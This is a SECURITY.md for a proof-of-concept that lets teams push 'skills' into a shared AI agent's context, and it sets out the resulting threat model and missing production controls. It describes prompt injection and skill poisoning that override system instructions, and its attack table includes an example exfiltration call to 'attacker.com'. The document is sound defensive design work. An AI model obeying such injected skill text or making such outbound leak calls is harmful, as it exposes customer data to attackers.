# SECURITY

`artifacts-lee-skills` is a proof-of-concept. It demonstrates **the pattern**, not a production-safe deployment. This document names what's missing and why it matters.

## Threat model

If teams can push skills directly to a shared agent's runtime context, the attack surface is **the entire agent** for **every customer it serves**. Anyone who can write to a team's namespace can inject:

- Prompts that override the agent's system instructions
- Fake "skills" that redirect tools to attacker-controlled URLs
- Content that leaks customer data via outbound tool calls
- Self-replicating payloads that propagate to other teams' namespaces via cross-references

**The bottleneck the PoC removes was a security control.** Real deployment must replace it with a faster gate, not no gate.

## Specific attack vectors

| Vector | What it looks like | Status in PoC |
|---|---|---|
| Stolen write token | Attacker uses `TEAM_DATABASE_TOKEN` to push arbitrary content | Mitigated only by 1h TTL — needs Cloudflare Access on `/team/:slug/write-token` |
| Compromised team member | Legitimate creds used maliciously | Unmitigated — needs branch protection + required reviewer |
| Insider threat | Team member intentionally poisons their own namespace | Unmitigated — needs human review pre-promotion |
| Adversarial markdown | Well-meaning skill contains injection-pattern text | Unmitigated — needs content scanning at ingest |
| Cache-poisoning the agent's read | Attacker times push to coincide with agent read window | Unmitigated — needs pinned-SHA reads (not `main`) |
| Force-push history rewrite | Attacker wipes audit trail | Unmitigated — needs append-only repos / push protection |
| Cross-namespace write escalation | Token from one team used against another | **Mitigated** — Artifacts enforces per-namespace token scoping |
| Skill exfiltrates data via tool | Skill instructs agent to call `fetch(attacker.com/?leak=...)` | Unmitigated — needs outbound tool filter at agent runtime |

## What's missing for production

Eight controls, ranked by ROI:

1. **Cloudflare Access on `/team/:slug/write-token`** — replace shared bearer with SSO group membership. Token-mint requires re-authentication.
2. **Pinned-SHA reads** — agent reads from a curated commit SHA, not `main`. Promotion requires explicit action.
3. **Promotion-with-review route** — `POST /team/:slug/promote` runs the candidate SHA through ingest checks (gateproof-style observe/assert) before updating the pinned SHA.
4. **Content scanning at ingest** — when a skill is pushed, scan it against known injection patterns + run an LLM judge for "is this trying to override the system?" before allowing promotion. Reuses `judgeScore` from proof-spec.
5. **Signed commits** — require Sigstore / SSH-key-signed commits with verifiable team-member identity. Artifacts may add this; until then, pre-receive hook in a Worker can enforce.
6. **Append-only repo policy** — disallow force-push at the Artifacts level (when supported). Until then, periodic snapshot-to-R2 for tamper detection.
7. **Outbound tool filter at agent runtime** — agent's tool runner refuses outbound calls to non-allowlisted hosts. Even if a skill says "fetch attacker.com," the runner blocks.
8. **Audit log surfacing** — pull `git log` per push into a SIEM-shaped event stream (Logpush). Detection-as-code rules on the stream catch suspicious patterns.

## The architecture this implies

```
       team member
            │
       Access SSO ────┐
            │         │
            ▼         ▼
   POST /write-token (gated by Access group membership)
            │
       short-lived write token (~1h)
            │
            ▼
       git push  ──────►  Artifacts repo (staging branch)
                                │
                                ▼
                    ingest scanner (Worker)
                    - regex injection-pattern check
                    - judgeScore: is this an override attempt?
                    - schema validation
                                │
                ┌───────────────┴──────────────┐
              pass                            fail
                │                               │
                ▼                               ▼
          promote SHA                    reject + log + notify
                │
                ▼
        agent reads pinned SHA
                │
                ▼
       outbound tool filter
                │
                ▼
            customer
```

The PoC implements only the rightmost arrow. Everything to the left of "agent reads" is unbuilt.

## Why this matters more than typical agent security

A normal agent has **one** system prompt the model maintainer controls. This pattern gives **N teams** the ability to inject text into the agent's effective system prompt at the speed of `git push`. The threat surface area scales linearly with team count, and the audit lag is `agent_read_interval` — minutes, possibly seconds.

For a single-customer agent, this is a tractable risk: team members are trusted, and the customer is the only blast radius.

For a **shared agent serving N customers** (which is the entire point of the Lee-team-editable problem), the blast radius is N × team_count. One compromised team member affects every customer that interacts with the agent on a topic that team owns.

## What's NOT in scope for this PoC

Specifically out of scope. Don't deploy this to production thinking these are handled:

- Authentication beyond shared bearers (use Access)
- Authorization beyond per-team scoping (add reviewer flows)
- Promotion / staging (add a curated-SHA layer)
- Content scanning (integrate with proof-spec's `judgeScore`)
- Audit / detection (export to Logpush)
- Outbound filtering at the agent (separate concern — lives at the agent's tool runner)
- Tamper-evident history (rely on Artifacts roadmap or supplement with snapshots)

## If you're deploying this for real

Implement controls 1-3 minimum before any customer-facing agent reads from these repos. Controls 4-7 before serving more than one customer. Control 8 always.

---

## Related context

- `~/cloudflare/.context/CF-ARTIFACTS-PRIMITIVE.md` — the strategic framing
- `gateproof` — the verify-before-promote pattern, available as a library: `github.com/acoyfellow/gateproof`
- `proof-spec.v0` — the `judgeScore` assertion kind for content scanning lives there
